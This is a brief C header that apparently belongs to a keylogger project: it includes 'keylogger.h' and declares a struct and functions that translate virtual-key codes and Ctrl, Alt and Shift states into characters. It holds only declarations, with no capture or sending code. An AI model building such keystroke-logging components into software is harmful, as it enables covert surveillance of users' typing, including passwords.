#ifndef INCLUDE_DICTIONARY_H
#define INCLUDE_DICTIONARY_H
#pragma once
#include "keylogger.h"

typedef struct {
    u8 chr;
    u32 vkCode;
    u8 alt;
    u8 control;
    u8 shift;
} keyDictionaryEntry;

void constructKeyDictionary();
char getCharFromCombination(u32 vkCOde, u8 isControlPressed, u8 isAltPressed, u8 isShiftPressed);

#endif // DICTIONARY_H
